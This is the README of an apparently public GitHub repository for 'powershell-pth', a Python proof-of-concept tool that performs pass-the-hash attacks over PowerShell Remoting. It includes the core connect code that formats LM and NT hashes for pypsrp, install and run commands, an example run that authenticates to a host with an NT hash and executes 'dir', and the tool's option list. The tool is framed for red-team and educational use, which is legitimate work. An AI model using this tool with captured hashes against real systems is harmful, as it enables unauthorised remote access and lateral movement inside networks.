# PowerShell Pass-the-Hash


## Disclaimer

The contents of this repository are for educational purposes. Do
not use this information to access any system without the express written
permission of the system's owner, such as during a red team activity. The author
is not liable for any damage, direct or indirect, caused by the information
contained in this repository.

## Description

This repository contains a simple, cross-platform, proof-of-concept utility for
the automation of [pass-the-hash](https://en.hackndo.com/pass-the-hash/) attacks
against servers with PowerShell Remoting enabled.


## Why did you write this utility?

I couldn't find any example code written in Python that executes a
pass-the-hash attack over PowerShell Remoting. The best Python library I've
been able to find for using PowerShell Remoting is
[pypsrp](https://pypi.org/project/pypsrp/). pypsrp allows you to interact with
PowerShell Remoting programmatically from both Windows and Linux. It's not
obvious how to use pypsrp to execute a pass-the-hash attack. This utility
serves as an example that red teamers can use to write their own Python code to
automate pass-the-hash attacks.

Simply put, this is the magic that makes everything work:

```python
def connect(host, username, lm_hash, nt_hash, use_ssl=True, timeout=3):
    # The pypsrp library requires LM or NT hashes to be formatted like "LM_HASH:NT_HASH"
    #
    # Example:
    # If your LM hash is 1ec78eb5f6edd379351858c437fc3e4e and your NT hash is
    # 79a760336ad8c808fee32aa96985a305, then you would pass
    # "1ec78eb5f6edd379351858c437fc3e4e:79a760336ad8c808fee32aa96985a305" as the
    # `password` parameter to pypsrp.
    #
    # pypsrp will parse this string and automatically use the appropriate hash
    # for NTLM authentication.
    #
    # If you only have one of the two hashes, this script will automatically
    # populate the other hash with zeros.
    formatted_ntlm_hashes = f"{lm_hash}:{nt_hash}"
```
[See code in context](https://github.com/mssalvatore/powershell-pth/blob/e8bd82e3120b9ecec9f19a9d14451831640dc6b0/powershell-pth.py#L39-L53)

## How should I use this utility?

This utility is primarily intended to be an example you can use to write your
own tools. However, it does provide basic functionality. If you have a target
host, username, and a hash, you can use this utility to try to gain access to
the target (see [disclaimer](#disclaimer)).

## How do I run powershell-pth.py

Install the necessary Python dependencies:
```
$ pip install -r requirements.txt
```

Invoke the script with `python`. Example:

```
$ python powershell-pth.py --cmd dir --host 10.0.0.30 --username test --nt_hash 10f017bbc08a8d415d60299c06f4869f
Authentication succeeded -- Username: test, LM Hash: 00000000000000000000000000000000, NT Hash: 10f017bbc08a8d415d60299c06f4869f
Running command: dir
STDOUT:
 Volume in drive C has no label.
 Volume Serial Number is 5719-64DC

 Directory of C:\Users\test

09/24/2021  08:44 AM    <DIR>          .
09/24/2021  08:44 AM    <DIR>          ..
08/20/2021  07:37 AM    <DIR>          Contacts
08/20/2021  07:37 AM    <DIR>          Desktop
09/24/2021  08:44 AM    <DIR>          Documents
09/01/2021  08:28 AM    <DIR>          Downloads
08/20/2021  07:37 AM    <DIR>          Favorites
08/20/2021  07:37 AM    <DIR>          Links
08/20/2021  07:37 AM    <DIR>          Music
08/20/2021  07:37 AM    <DIR>          Pictures
08/20/2021  07:37 AM    <DIR>          Saved Games
08/20/2021  07:37 AM    <DIR>          Searches
08/20/2021  07:37 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  31,387,150,750 bytes free



STDERR:



RETURN CODE: 0
```

`powershell-pth.py` can be run with an NT hash (`--nt_hash`), an LM hash
(`--lm_hash`), or both.

Run `python powershell-pth.py --help` for more options.
```
$  python powershell-pth.py --help
Usage: powershell-pth.py [OPTIONS]

Options:
  --cmd TEXT         [required]
  --host TEXT        [required]
  --username TEXT    [required]
  --lm_hash TEXT
  --nt_hash TEXT
  --use_ssl BOOLEAN
  --timeout INTEGER
  --help             Show this message and exit.
```
